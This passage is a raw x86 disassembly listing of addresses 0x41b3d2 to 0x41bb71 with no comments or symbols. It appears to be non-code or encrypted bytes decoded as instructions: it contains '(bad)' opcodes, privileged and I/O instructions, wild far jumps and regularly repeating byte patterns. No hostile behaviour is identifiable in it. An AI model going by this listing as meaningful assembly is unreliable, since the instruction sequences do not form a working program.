  41b3d2:	xchg   esp,eax
  41b3d3:	inc    ecx
  41b3d4:	dec    eax
  41b3d5:	or     eax,0xc19bfe71
  41b3da:	adc    eax,eax
  41b3dc:	inc    eax
  41b3dd:	outs   dx,BYTE PTR ds:[esi]
  41b3de:	add    ch,dl
  41b3e0:	les    ebx,FWORD PTR [esp+ebx*4-0x33fffaf7]
  41b3e7:	inc    eax
  41b3e8:	inc    ecx
  41b3e9:	inc    eax
  41b3ea:	inc    ebx
  41b3eb:	bound  esp,QWORD PTR ds:0x41400043
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    eax,0x43624062
  41b3f8:	inc    ecx
  41b3f9:	inc    eax
  41b3fa:	inc    eax
  41b3fb:	inc    eax
  41b3fc:	add    eax,0x40624340
  41b401:	add    eax,0x40664140
  41b406:	inc    eax
  41b407:	mov    ch,0x2b
  41b409:	and    cl,BYTE PTR [edi+0x50]
  41b40c:	mov    esp,0x729f40f9
  41b411:	sub    dl,BYTE PTR [esp+esi*2+0x5]
  41b415:	mov    ds:0x64405f44,al
  41b41a:	adc    eax,0x4005a973
  41b41f:	add    DWORD PTR [ebx+0x0],0x10784005
  41b426:	inc    ecx
  41b427:	bound  eax,QWORD PTR [eax+0x40]
  41b42a:	sldt   WORD PTR [eax-0x34]
  41b42e:	js     0x41b492
  41b430:	add    eax,0x40664143
  41b435:	inc    ebx
  41b436:	add    BYTE PTR [ecx+0x5],al
  41b439:	js     0x41b47b
  41b43b:	bound  eax,QWORD PTR [eax+0x0]
  41b43e:	inc    eax
  41b43f:	jp     0x41b485
  41b441:	jnp    0x41b3ef
  41b443:	loop   0x41b486
  41b445:	dec    eax
  41b446:	inc    ecx
  41b447:	in     al,dx
  41b448:	sub    al,0xbc
  41b44a:	dec    ebx
  41b44b:	arpl   WORD PTR [ecx+0x40],ax
  41b44e:	add    al,BYTE PTR [ecx+0x422915fc]
  41b454:	rol    BYTE PTR [ecx+0x43],0x40
  41b458:	inc    eax
  41b459:	add    eax,0x434162
  41b45e:	inc    eax
  41b45f:	add    BYTE PTR [edx+0x5],ah
  41b462:	inc    eax
  41b463:	adc    BYTE PTR [edx+0x40],ah
  41b466:	inc    ebx
  41b467:	inc    ecx
  41b468:	add    eax,0x4340
  41b46d:	add    eax,0x404162
  41b472:	add    BYTE PTR [eax+0x43],al
  41b475:	inc    eax
  41b476:	add    eax,0xcd590940
  41b47b:	retf   
  41b47c:	push   esi
  41b47d:	clc    
  41b47e:	adc    al,BYTE PTR [eax+0x9]
  41b481:	add    DWORD PTR [edi+0x46],0x40f8ef10
  41b488:	adc    BYTE PTR [ebp+0x42cc15ee],0xa0
  41b48f:	inc    eax
  41b490:	jb     0x63418cda
  41b496:	adc    eax,0x2c6d6e40
  41b49b:	push   edx
  41b49c:	stos   DWORD PTR es:[edi],eax
  41b49d:	les    eax,FWORD PTR [ecx-0x67]
  41b4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4a1:	repnz inc eax
  41b4a3:	add    BYTE PTR [eax],al
  41b4a5:	inc    ecx
  41b4a6:	inc    ebx
  41b4a7:	add    eax,0x41784062
  41b4ac:	inc    eax
  41b4ad:	inc    eax
  41b4ae:	add    BYTE PTR [edi],cl
  41b4b0:	bound  eax,QWORD PTR [ebx+0x0]
  41b4b3:	add    eax,0x25006240
  41b4b8:	inc    eax
  41b4b9:	add    eax,0x40254143
  41b4be:	add    eax,0xfa620000
  41b4c3:	ror    BYTE PTR [edx+0x4f],0x41
  41b4c7:	stos   BYTE PTR es:[edi],al
  41b4c8:	jae    0x41b4cb
  41b4ca:	dec    eax
  41b4cb:	addr16 inc esp
  41b4cd:	inc    eax
  41b4ce:	sar    BYTE PTR [esi+ebp*2+0x5d],0x9d
  41b4d3:	in     al,dx
  41b4d4:	enter  0x44c,0x9b
  41b4d8:	mov    ebx,0xb08c4456
  41b4dd:	inc    ecx
  41b4de:	cli    
  41b4df:	xchg   edx,eax
  41b4e0:	xchg   ebp,eax
  41b4e1:	sub    DWORD PTR [edi*8+0x159eef05],0x43f80c51
  41b4ec:	add    BYTE PTR [eax],al
  41b4ee:	add    BYTE PTR [ecx+0x40],al
  41b4f1:	bound  esp,QWORD PTR [esi+0x0]
  41b4f4:	inc    eax
  41b4f5:	add    eax,0x5400000
  41b4fa:	inc    ecx
  41b4fb:	inc    eax
  41b4fc:	inc    eax
  41b4fd:	bound  esp,QWORD PTR ds:0x25050043
  41b503:	inc    ecx
  41b504:	inc    ebx
  41b505:	inc    eax
  41b506:	test   BYTE PTR [eax+0x0],al
  41b509:	bound  ebx,QWORD PTR [eax+0x62]
  41b50c:	inc    ecx
  41b50d:	inc    eax
  41b50e:	xchg   esp,eax
  41b50f:	retf   0xd40
  41b512:	enter  0x130d,0x44
  41b516:	cwde   
  41b517:	mov    eax,0x6d124165
  41b51c:	dec    ecx
  41b51d:	in     eax,dx
  41b51e:	or     eax,0xc7414f15
  41b523:	or     ebp,DWORD PTR ss:[ebp-0x37]
  41b527:	retf   
  41b528:	pop    edi
  41b529:	rcl    BYTE PTR [eax],0x62
  41b52c:	inc    eax
  41b52d:	inc    ecx
  41b52e:	and    eax,0x40000500
  41b533:	inc    ebx
  41b534:	add    eax,0x40624041
  41b539:	inc    ebx
  41b53a:	add    eax,0x43402541
  41b53f:	bound  eax,QWORD PTR [eax+0x43]
  41b542:	int3   
  41b543:	inc    eax
  41b544:	bound  eax,QWORD PTR [eax]
  41b546:	inc    ecx
  41b547:	inc    eax
  41b548:	inc    eax
  41b549:	add    eax,0x4d028e05
  41b54e:	inc    esp
  41b54f:	push   eax
  41b550:	dec    eax
  41b551:	sub    eax,0x1438a0d
  41b556:	sub    eax,0xf9982e41
  41b55b:	test   al,0x0
  41b55d:	inc    edx
  41b55e:	idiv   BYTE PTR [eax+edi*2]
  41b561:	ins    BYTE PTR es:[edi],dx
  41b562:	bound  eax,QWORD PTR [eax+0x25]
  41b565:	add    BYTE PTR [esi+0x40],ah
  41b568:	add    eax,0x40404143
  41b56d:	inc    ebx
  41b56e:	add    BYTE PTR [eax],al
  41b570:	add    BYTE PTR [edx-0x34],ah
  41b573:	inc    eax
  41b574:	add    eax,0x40004041
  41b579:	inc    ecx
  41b57a:	int3   
  41b57b:	add    BYTE PTR [ebx-0x7c],al
  41b57e:	add    eax,0x5406240
  41b583:	bound  ebx,QWORD PTR [ecx+edx*8+0x28cd8017]
  41b58a:	bound  esp,QWORD PTR [edx+0x5]
  41b58d:	popa   
  41b58e:	inc    eax
  41b58f:	xor    cl,dl
  41b591:	inc    edx
  41b592:	retf   
  41b593:	test   eax,0x5f729641
  41b598:	or     BYTE PTR cs:[eax],al
  41b59b:	mov    al,0x40
  41b59d:	bound  ebx,QWORD PTR [eax+0x41]
  41b5a0:	add    eax,0x40404340
  41b5a5:	inc    ebx
  41b5a6:	inc    eax
  41b5a7:	test   BYTE PTR [eax],al
  41b5a9:	add    eax,0x40624041
  41b5ae:	inc    eax
  41b5af:	add    BYTE PTR [edx+0x5],ah
  41b5b2:	inc    ebx
  41b5b3:	add    BYTE PTR [eax+0x78],al
  41b5b6:	inc    ecx
  41b5b7:	add    BYTE PTR [eax+0x41],bl
  41b5ba:	bound  eax,QWORD PTR [ecx+0x68]
  41b5bd:	inc    ebx
  41b5be:	and    BYTE PTR [esp+eax*8-0x6f],0x88
  41b5c3:	rol    BYTE PTR [eax-0x80],0x7a
  41b5c7:	inc    esp
  41b5c8:	dec    edi
  41b5c9:	push   edx
  41b5ca:	mov    es,WORD PTR ds:0x2cba9140
  41b5d0:	inc    ecx
  41b5d1:	mov    edi,0xf40f864
  41b5d6:	dec    edi
  41b5d7:	hlt    
  41b5d8:	sub    al,0xbd
  41b5da:	neg    BYTE PTR [edx+0xc804040]
  41b5e0:	cmp    al,0xb1
  41b5e2:	int3   
  41b5e3:	adc    eax,0x8d2c14db
  41b5e8:	lods   al,BYTE PTR ds:[esi]
  41b5e9:	bound  edx,QWORD PTR [eax+0x41]
  41b5ec:	cmc    
  41b5ed:	pop    ss
  41b5ee:	dec    eax
  41b5ef:	inc    esp
  41b5f0:	add    eax,0x80424d65
  41b5f5:	inc    eax
  41b5f6:	test   BYTE PTR [eax],al
  41b5f8:	int3   
  41b5f9:	bound  eax,QWORD PTR ds:0xcc840f41
  41b5ff:	inc    ebx
  41b600:	add    BYTE PTR [eax+0x0],al
  41b603:	inc    eax
  41b604:	inc    eax
  41b605:	inc    eax
  41b606:	int3   
  41b607:	add    BYTE PTR ds:0x62404341,al
  41b60d:	pop    eax
  41b60e:	add    BYTE PTR [ebx+0x40],al
  41b611:	bound  ecx,QWORD PTR [edi]
  41b613:	inc    eax
  41b614:	in     al,0x80
  41b616:	sub    al,0xc9
  41b618:	loopne 0x41b617
  41b61a:	(bad)  
  41b61b:	out    0x72,eax
  41b61d:	sub    eax,0x67625df2
  41b622:	adc    al,0x47
  41b624:	pop    ss
  41b625:	dec    eax
  41b626:	aad    0xdf
  41b628:	es pop esp
  41b62a:	cli    
  41b62b:	retf   
  41b62c:	xlat   BYTE PTR ds:[ebx]
  41b62d:	add    BYTE PTR [ecx+0x2f],0x30
  41b631:	sub    eax,0x260b3e98
  41b636:	into   
  41b637:	jmp    0x494f73e4
  41b63c:	rol    DWORD PTR [edx],1
  41b63e:	jne    0x41b5e8
  41b640:	adc    cl,BYTE PTR [edi-0x78ff1cbf]
  41b646:	inc    esp
  41b647:	adc    BYTE PTR [ecx-0x70],al
  41b64a:	inc    edx
  41b64b:	jge    0x41b60e
  41b64d:	pusha  
  41b64e:	sub    eax,0x40400000
  41b653:	cmovno eax,DWORD PTR ds:0x40056243
  41b65a:	int3   
  41b65b:	add    ah,cl
  41b65d:	inc    eax
  41b65e:	inc    eax
  41b65f:	bound  eax,QWORD PTR [ecx+0x0]
  41b662:	add    BYTE PTR [edi],cl
  41b664:	inc    ebx
  41b665:	inc    eax
  41b666:	inc    eax
  41b667:	add    BYTE PTR [ecx+0x43],al
  41b66a:	add    eax,0x40256240
  41b66f:	bound  eax,QWORD PTR [eax]
  41b671:	test   al,0xd1
  41b673:	xchg   ecx,eax
  41b674:	in     al,0x48
  41b676:	push   edi
  41b677:	xor    al,0x5
  41b67a:	les    edi,FWORD PTR [edi-0x14bcd507]
  41b680:	int    0x43
  41b682:	push   esi
  41b683:	or     dl,BYTE PTR [esi+0x4134c2bf]
  41b689:	data16 and BYTE PTR [esi],dl
  41b68c:	add    eax,0xce007e63
  41b691:	hlt    
  41b692:	add    al,0x62
  41b694:	inc    ecx
  41b695:	imul   edx,DWORD PTR [eax+eax*4+0x70],0x63
  41b69a:	sub    BYTE PTR [eax-0x3d],cl
  41b69d:	jno    0x41b65f
  41b69f:	and    eax,0xcc000544
  41b6a4:	inc    eax
  41b6a5:	inc    ecx
  41b6a6:	inc    eax
  41b6a7:	inc    ebx
  41b6a8:	bound  esp,QWORD PTR ds:0x41400043
  41b6ae:	add    BYTE PTR [eax],al
  41b6b0:	add    eax,0x43624062
  41b6b5:	inc    ecx
  41b6b6:	inc    eax
  41b6b7:	inc    eax
  41b6b8:	inc    eax
  41b6b9:	add    eax,0x40624340
  41b6be:	add    eax,0x40664140
  41b6c3:	test   al,0xf7
  41b6c5:	fcomp  DWORD PTR [ecx]
  41b6c7:	xor    ch,BYTE PTR [edi+0x7]
  41b6ca:	sub    eax,0xf852f67c
  41b6cf:	xchg   esp,eax
  41b6d0:	inc    eax
  41b6d1:	sub    dh,0xa1
  41b6d4:	bound  ebp,QWORD PTR [edx-0x6c]
  41b6d7:	sar    BYTE PTR [esi+ebp*1-0x3b],0x43
  41b6dc:	add    BYTE PTR ds:0x41107840,al
  41b6e2:	bound  eax,QWORD PTR [eax+0x40]
  41b6e5:	sldt   WORD PTR [eax-0x34]
  41b6e9:	js     0x41b74d
  41b6eb:	add    eax,0x40664143
  41b6f0:	inc    ebx
  41b6f1:	add    BYTE PTR [ecx+0x5],al
  41b6f4:	js     0x41b736
  41b6f6:	bound  eax,QWORD PTR [eax+0x0]
  41b6f9:	inc    eax
  41b6fa:	arpl   WORD PTR [eax-0x7],si
  41b6fd:	adc    eax,0x455a5ff3
  41b702:	sub    BYTE PTR [ebx],dh
  41b704:	arpl   WORD PTR [ecx+0x62],ax
  41b707:	fld    DWORD PTR [eax]
  41b709:	faddp  st(4),st
  41b70b:	dec    esp
  41b70c:	test   eax,0x29810c26
  41b711:	jns    0x41b762
  41b713:	add    eax,0xc293f4dc
  41b718:	mov    BYTE PTR [eax+eax*2+0x7b],0x61
  41b71d:	arpl   ax,bp
  41b71f:	jecxz  0x41b722
  41b721:	sub    eax,0x13284288
  41b726:	and    ch,BYTE PTR [ebx]
  41b728:	adc    eax,0x64953dec
  41b72d:	cli    
  41b72e:	push   0xc3d57a40
  41b733:	pop    eax
  41b734:	pop    esp
  41b735:	inc    ecx
  41b736:	inc    ebx
  41b737:	inc    eax
  41b738:	inc    eax
  41b739:	add    eax,0x434162
  41b73e:	inc    eax
  41b73f:	add    BYTE PTR [edx+0x5],ah
  41b742:	inc    eax
  41b743:	adc    BYTE PTR [edx+0x40],ah
  41b746:	inc    ebx
  41b747:	inc    ecx
  41b748:	add    eax,0x4340
  41b74d:	add    eax,0x404162
  41b752:	add    BYTE PTR [eax+0x43],al
  41b755:	inc    eax
  41b756:	add    eax,0x22ecc71
  41b75b:	mov    BYTE PTR cs:[edx+0x34],ah
  41b75f:	retf   0x37fb
  41b762:	cmp    BYTE PTR [esi],ch
  41b764:	add    eax,0x7f6226bf
  41b769:	ror    DWORD PTR [ecx+0x54],0xc9
  41b76d:	sub    al,0x10
  41b76f:	lds    esi,FWORD PTR [edi-0x6dbb7e9b]
  41b775:	arpl   WORD PTR [edx+0x4f],dx
  41b778:	(bad)  
  41b779:	rcr    BYTE PTR [esi+0x2c],0x48
  41b77d:	mov    esp,0x1f1142a9
  41b782:	push   cs
  41b783:	jmp    0x57e6:0x48b01e49
  41b78a:	inc    eax
  41b78b:	add    BYTE PTR [eax],al
  41b78d:	inc    ecx
  41b78e:	inc    ebx
  41b78f:	add    eax,0x41784062
  41b794:	inc    eax
  41b795:	inc    eax
  41b796:	add    BYTE PTR [edi],cl
  41b798:	bound  eax,QWORD PTR [ebx+0x0]
  41b79b:	add    eax,0x25006240
  41b7a0:	inc    eax
  41b7a1:	add    eax,0x40254143
  41b7a6:	add    eax,0x36620000
  41b7ab:	bound  esi,QWORD PTR [eax]
  41b7ad:	xor    eax,0xc2624115
  41b7b2:	or     BYTE PTR [ebp+0x1ec958f4],al
  41b7b8:	push   ebx
  41b7b9:	xor    al,0x1
  41b7bb:	rcr    BYTE PTR gs:[eax+0x5acac451],1
  41b7c2:	inc    ebp
  41b7c3:	inc    esp
  41b7c4:	inc    ebx
  41b7c5:	pop    ebx
  41b7c6:	retf   
  41b7c7:	arpl   cx,di
  41b7c9:	and    cl,BYTE PTR [edx-0x4fafc1d4]
  41b7cf:	es pop edx
  41b7d1:	ret    0xe832
  41b7d4:	into   
  41b7d5:	push   esi
  41b7d6:	or     eax,0x43
  41b7db:	inc    ecx
  41b7dc:	inc    eax
  41b7dd:	bound  esp,QWORD PTR [esi+0x0]
  41b7e0:	inc    eax
  41b7e1:	add    eax,0x5400000
  41b7e6:	inc    ecx
  41b7e7:	inc    eax
  41b7e8:	inc    eax
  41b7e9:	bound  esp,QWORD PTR ds:0x25050043
  41b7ef:	inc    ecx
  41b7f0:	inc    ebx
  41b7f1:	inc    eax
  41b7f2:	test   BYTE PTR [eax+0x0],al
  41b7f5:	bound  ebx,QWORD PTR [eax+0x62]
  41b7f8:	inc    ecx
  41b7f9:	inc    eax
  41b7fa:	test   eax,0xc5f6321f
  41b7ff:	aaa    
  41b800:	cmp    al,0xcb
  41b802:	inc    edi
  41b803:	cmp    BYTE PTR [eax+0x1a],bl
  41b806:	pop    ds
  41b807:	imul   esp,esp,0xc05d1e4d
  41b80d:	add    DWORD PTR [edx+0x68ab5763],ebx
  41b813:	mov    al,0x10
  41b815:	bound  eax,QWORD PTR [eax+0x41]
  41b818:	and    eax,0x40000500
  41b81d:	inc    ebx
  41b81e:	add    eax,0x40624041
  41b823:	inc    ebx
  41b824:	add    eax,0x43402541
  41b829:	bound  eax,QWORD PTR [eax+0x43]
  41b82c:	int3   
  41b82d:	inc    eax
  41b82e:	bound  eax,QWORD PTR [eax]
  41b830:	inc    ecx
  41b831:	inc    eax
  41b832:	inc    eax
  41b833:	add    eax,0x54273405
  41b838:	inc    ebp
  41b839:	pushf  
  41b83a:	inc    ecx
  41b83b:	dec    ebx
  41b83c:	popa   
  41b83d:	push   ebp
  41b83e:	add    DWORD PTR [eax+edx*8-0x10],eax
  41b842:	mov    edi,0x4bc0f7b0
  41b847:	sub    al,0xd9
  41b849:	mov    dl,0x5
  41b84b:	push   ss
  41b84c:	cwde   
  41b84d:	bound  eax,QWORD PTR [eax-0x79573b1a]
  41b853:	mov    esp,0x25406220
  41b858:	add    BYTE PTR [esi+0x40],ah
  41b85b:	add    eax,0x40404143
  41b860:	inc    ebx
  41b861:	add    BYTE PTR [eax],al
  41b863:	add    BYTE PTR [edx-0x34],ah
  41b866:	inc    eax
  41b867:	add    eax,0x40004041
  41b86c:	inc    ecx
  41b86d:	int3   
  41b86e:	add    BYTE PTR [ebx-0x7c],al
  41b871:	add    eax,0x5406240
  41b876:	bound  ecx,QWORD PTR [esp+edi*2+0x48]
  41b87a:	dec    edi
  41b87b:	adc    DWORD PTR [ebx+eiz*2+0x56],ecx
  41b87f:	rcr    BYTE PTR [edi],0xfd
  41b882:	mov    edi,0x497a1e41
  41b887:	push   cs
  41b888:	add    DWORD PTR [ebx],edi
  41b88a:	inc    ecx
  41b88b:	clc    
  41b88c:	xchg   esp,eax
  41b88d:	pushf  
  41b88e:	mov    ch,0xea
  41b890:	push   edi
  41b891:	inc    esp
  41b892:	jno    0x41b84c
  41b894:	inc    eax
  41b895:	bound  ebx,QWORD PTR [eax+0x41]
  41b898:	add    eax,0x40404340
  41b89d:	inc    ebx
  41b89e:	inc    eax
  41b89f:	test   BYTE PTR [eax],al
  41b8a1:	add    eax,0x40624041
  41b8a6:	inc    eax
  41b8a7:	add    BYTE PTR [edx+0x5],ah
  41b8aa:	inc    ebx
  41b8ab:	add    BYTE PTR [eax+0x78],al
  41b8ae:	inc    ecx
  41b8af:	add    BYTE PTR [eax+0x41],bl
  41b8b2:	bound  esp,QWORD PTR [edx+0x48]
  41b8b5:	ret    
  41b8b6:	inc    ebp
  41b8b7:	test   BYTE PTR ds:0xc9cb65dc,ch
  41b8bd:	outs   dx,BYTE PTR ds:[esi]
  41b8be:	shl    BYTE PTR [edx-0x1c],0x65
  41b8c2:	push   edi
  41b8c3:	dec    esp
  41b8c4:	mov    esp,0xcd4901f4
  41b8c9:	inc    ebp
  41b8ca:	cmp    al,0x70
  41b8cc:	or     eax,0x5d804001
  41b8d1:	shl    al,1
  41b8d3:	mov    dl,0xcb
  41b8d5:	pop    es
  41b8d6:	or     eax,0xacc0fead
  41b8db:	bound  ecx,QWORD PTR [ebx+ebp*1+0x40]
  41b8df:	ja     0x41b925
  41b8e1:	inc    ebp
  41b8e2:	(bad)  
  41b8e3:	leave  
  41b8e4:	inc    ebx
  41b8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e6:	pop    ds
  41b8e7:	inc    eax
  41b8e8:	sub    al,0x40
  41b8ea:	test   BYTE PTR [eax],al
  41b8ec:	int3   
  41b8ed:	bound  eax,QWORD PTR ds:0xcc840f41
  41b8f3:	inc    ebx
  41b8f4:	add    BYTE PTR [eax+0x0],al
  41b8f7:	inc    eax
  41b8f8:	inc    eax
  41b8f9:	inc    eax
  41b8fa:	int3   
  41b8fb:	add    BYTE PTR ds:0x62404341,al
  41b901:	pop    eax
  41b902:	add    BYTE PTR [ebx+0x40],al
  41b905:	bound  ecx,QWORD PTR [edi]
  41b907:	inc    eax
  41b908:	xor    DWORD PTR [ecx+0x44d64026],ebp
  41b90e:	add    esp,edx
  41b910:	out    dx,al
  41b911:	mov    ah,0x1
  41b913:	adc    BYTE PTR [eax-0x40],cl
  41b916:	dec    ecx
  41b917:	lds    edx,FWORD PTR [ecx]
  41b919:	dec    esp
  41b91a:	jp     0x41b987
  41b91c:	push   esi
  41b91d:	add    BYTE PTR [eax],al
  41b91f:	inc    eax
  41b920:	inc    eax
  41b921:	cmovno eax,DWORD PTR ds:0x40056243
  41b928:	int3   
  41b929:	add    ah,cl
  41b92b:	inc    eax
  41b92c:	inc    eax
  41b92d:	bound  eax,QWORD PTR [ecx+0x0]
  41b930:	add    BYTE PTR [edi],cl
  41b932:	inc    ebx
  41b933:	inc    eax
  41b934:	inc    eax
  41b935:	add    BYTE PTR [ecx+0x43],al
  41b938:	add    eax,0x40256240
  41b93d:	bound  eax,QWORD PTR [eax]
  41b93f:	add    eax,DWORD PTR [eax]
  41b941:	outs   dx,DWORD PTR ds:[esi]
  41b942:	xor    eax,0x5c636232
  41b947:	ret    0xfe01
  41b94a:	inc    ebp
  41b94b:	push   esp
  41b94c:	mov    ecx,0x5c404efc
  41b951:	inc    esp
  41b952:	lock outs dx,BYTE PTR ds:[esi]
  41b954:	rol    BYTE PTR [edi-0x6c],1
  41b957:	or     DWORD PTR [eax+0x63fc432c],eax
  41b95d:	and    al,0xa2
  41b95f:	inc    eax
  41b960:	jne    0x41b942
  41b962:	inc    eax
  41b963:	ins    DWORD PTR es:[edi],dx
  41b964:	mov    edi,0x40160292
  41b969:	aad    0xf1
  41b96b:	imul   esi,DWORD PTR [ebp+0x7a],0x7454404b
  41b972:	imul   edi,eax,0x1213dd09
  41b978:	arpl   si,bp
  41b97a:	inc    edx
  41b97b:	fs add eax,0x4140cc00
  41b981:	inc    eax
  41b982:	inc    ebx
  41b983:	bound  esp,QWORD PTR ds:0x41400043
  41b989:	add    BYTE PTR [eax],al
  41b98b:	add    eax,0x43624062
  41b990:	inc    ecx
  41b991:	inc    eax
  41b992:	inc    eax
  41b993:	inc    eax
  41b994:	add    eax,0x40624340
  41b999:	add    eax,0x40664140
  41b99e:	push   edx
  41b99f:	rol    ch,1
  41b9a1:	inc    eax
  41b9a2:	adc    al,BYTE PTR [edi+edx*4+0x6f]
  41b9a6:	jne    0x41b973
  41b9a8:	mov    al,BYTE PTR ds:0x3cc42c91
  41b9ae:	test   al,0xbf
  41b9b0:	mov    ds:0x4fde7040,eax
  41b9b5:	bound  esp,QWORD PTR [edx-0x41]
  41b9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9b9:	inc    eax
  41b9ba:	add    al,0x48
  41b9bc:	mov    edi,0xc5a9ea57
  41b9c1:	adc    esp,DWORD PTR [ebp-0x63]
  41b9c4:	pushf  
  41b9c5:	mov    esp,0x40dba119
  41b9ca:	push   edx
  41b9cb:	inc    esp
  41b9cc:	cmp    eax,0x40431654
  41b9d1:	add    DWORD PTR gs:[ebx+eax*8],ebp
  41b9d5:	dec    eax
  41b9d6:	stos   BYTE PTR es:[edi],al
  41b9d7:	adc    al,0x40
  41b9d9:	loop   0x41ba51
  41b9db:	inc    ebx
  41b9dc:	add    BYTE PTR ds:0x41107840,al
  41b9e2:	bound  eax,QWORD PTR [eax+0x40]
  41b9e5:	sldt   WORD PTR [eax-0x34]
  41b9e9:	js     0x41ba4d
  41b9eb:	add    eax,0x40664143
  41b9f0:	inc    ebx
  41b9f1:	add    BYTE PTR [ecx+0x5],al
  41b9f4:	js     0x41ba36
  41b9f6:	bound  eax,QWORD PTR [eax+0x0]
  41b9f9:	inc    eax
  41b9fa:	fcomp  QWORD PTR [eax+esi*2-0x3fbf779c]
  41ba01:	or     al,0xc5
  41ba03:	add    eax,0x40626817
  41ba08:	jge    0x41ba6c
  41ba0a:	inc    ebp
  41ba0b:	leave  
  41ba0c:	and    al,0x11
  41ba0e:	jp     0x41ba4d
  41ba10:	inc    eax
  41ba11:	inc    eax
  41ba12:	(bad)  
  41ba13:	xchg   ecx,eax
  41ba14:	lods   al,BYTE PTR ds:[esi]
  41ba15:	retf   
  41ba16:	cmp    al,0xec
  41ba18:	es sub al,0x44
  41ba1b:	dec    ecx
  41ba1c:	add    ch,BYTE PTR [esp+eax*2+0x2c7d4823]
  41ba23:	pop    ebx
  41ba24:	mov    cl,0xd
  41ba26:	sub    cl,ah
  41ba28:	inc    eax
  41ba29:	inc    esi
  41ba2a:	fidiv  DWORD PTR [eax]
  41ba2c:	push   ebx
  41ba2d:	retf   
  41ba2e:	adc    eax,ecx
  41ba30:	and    eax,0x41e8d588
  41ba35:	inc    ebx
  41ba36:	inc    eax
  41ba37:	inc    eax
  41ba38:	add    eax,0x434162
  41ba3d:	inc    eax
  41ba3e:	add    BYTE PTR [edx+0x5],ah
  41ba41:	inc    eax
  41ba42:	adc    BYTE PTR [edx+0x40],ah
  41ba45:	inc    ebx
  41ba46:	inc    ecx
  41ba47:	add    eax,0x4340
  41ba4c:	add    eax,0x404162
  41ba51:	add    BYTE PTR [eax+0x43],al
  41ba54:	inc    eax
  41ba55:	add    eax,0xf544348
  41ba5a:	push   edx
  41ba5b:	pusha  
  41ba5c:	pop    ebp
  41ba5d:	jle    0x41ba28
  41ba5f:	or     bh,BYTE PTR [edi]
  41ba61:	jg     0x41ba24
  41ba63:	inc    esp
  41ba64:	fisub  WORD PTR [ecx]
  41ba66:	mov    ah,0x3c
  41ba68:	ins    DWORD PTR es:[edi],dx
  41ba69:	adc    al,BYTE PTR [edi-0x80]
  41ba6c:	sub    ah,BYTE PTR [ebp-0x51]
  41ba6f:	jbe    0x41ba31
  41ba71:	aad    0xc0
  41ba73:	and    al,0x44
  41ba75:	fwait
  41ba76:	imul   esi,DWORD PTR [esi+eax*8],0xffffffad
  41ba7a:	and    DWORD PTR [ebp+ebp*1-0x58],esp
  41ba7e:	arpl   WORD PTR [eax-0x58],ax
  41ba81:	cmp    DWORD PTR [edx+eax*1-0x28],eax
  41ba85:	dec    ebx
  41ba86:	(bad)  
  41ba87:	and    BYTE PTR [ebp+0xa],ah
  41ba8a:	inc    eax
  41ba8b:	add    BYTE PTR [eax],al
  41ba8d:	inc    ecx
  41ba8e:	inc    ebx
  41ba8f:	add    eax,0x41784062
  41ba94:	inc    eax
  41ba95:	inc    eax
  41ba96:	add    BYTE PTR [edi],cl
  41ba98:	bound  eax,QWORD PTR [ebx+0x0]
  41ba9b:	add    eax,0x25006240
  41baa0:	inc    eax
  41baa1:	add    eax,0x40254143
  41baa6:	add    eax,0xc0620000
  41baab:	jl     0x41ba7a
  41baad:	aas    
  41baae:	stos   DWORD PTR es:[edi],eax
  41baaf:	jmp    DWORD PTR [esi]
  41bab1:	or     BYTE PTR [esi+0x13],ch
  41bab4:	fiadd  DWORD PTR [eax+0x4c]
  41bab7:	adc    dh,BYTE PTR fs:[eax+eax*2-0x7ba00d73]
  41babf:	inc    esp
  41bac0:	inc    ebp
  41bac1:	jo     0x41bb37
  41bac3:	adc    eax,0x43c34164
  41bac8:	add    BYTE PTR [eax],al
  41baca:	add    BYTE PTR [ecx+0x40],al
  41bacd:	bound  esp,QWORD PTR [esi+0x0]
  41bad0:	inc    eax
  41bad1:	add    eax,0x5400000
  41bad6:	inc    ecx
  41bad7:	inc    eax
  41bad8:	inc    eax
  41bad9:	bound  esp,QWORD PTR ds:0x25050043
  41badf:	inc    ecx
  41bae0:	inc    ebx
  41bae1:	inc    eax
  41bae2:	test   BYTE PTR [eax+0x0],al
  41bae5:	bound  ebx,QWORD PTR [eax+0x62]
  41bae8:	inc    ecx
  41bae9:	inc    eax
  41baea:	or     eax,DWORD PTR [ecx+0x53]
  41baed:	jno    0x41bb07
  41baef:	inc    esp
  41baf0:	mov    edi,0x3b146142
  41baf5:	dec    edx
  41baf6:	add    DWORD PTR [eax+ebp*1],ebp
  41baf9:	daa    
  41bafa:	arpl   bp,cx
  41bafc:	xchg   esp,eax
  41bafd:	rcl    BYTE PTR [ebx-0x2a],0x45
  41bb01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb02:	test   eax,0x872246b0
  41bb07:	lds    eax,FWORD PTR [ebx+0x63]
  41bb0a:	test   al,0xd
  41bb0c:	cmp    DWORD PTR [ebx+0x40],ecx
  41bb0f:	ret    0x7c70
  41bb12:	adc    al,0xcb
  41bb14:	and    cl,al
  41bb16:	add    al,0x56
  41bb18:	mov    eax,0x1044ce98
  41bb1d:	bound  eax,QWORD PTR [eax+0x41]
  41bb20:	and    eax,0x40000500
  41bb25:	inc    ebx
  41bb26:	add    eax,0x40624041
  41bb2b:	inc    ebx
  41bb2c:	add    eax,0x43402541
  41bb31:	bound  eax,QWORD PTR [eax+0x43]
  41bb34:	int3   
  41bb35:	inc    eax
  41bb36:	bound  eax,QWORD PTR [eax]
  41bb38:	inc    ecx
  41bb39:	inc    eax
  41bb3a:	inc    eax
  41bb3b:	add    eax,0x70cb0705
  41bb40:	fs fs cmp eax,0xced54662
  41bb47:	inc    eax
  41bb48:	inc    esp
  41bb49:	jo     0x41bb72
  41bb4b:	mov    al,ds:0x323841
  41bb50:	sub    al,0xb0
  41bb52:	popa   
  41bb53:	or     eax,0x78d0373c
  41bb58:	aam    0x62
  41bb5a:	test   al,0xc9
  41bb5c:	cmp    al,0x1d
  41bb5e:	rcl    BYTE PTR [edx-0x2b],0x40
  41bb62:	adc    DWORD PTR [edx-0x26],eax
  41bb65:	(bad)  
  41bb66:	jl     0x41baf1
  41bb68:	inc    edi
  41bb69:	inc    ebx
  41bb6a:	inc    ecx
  41bb6b:	inc    ecx
  41bb6c:	push   0xffffff94
  41bb6e:	sbb    dl,BYTE PTR [esi-0x12]
  41bb71:	inc    edi
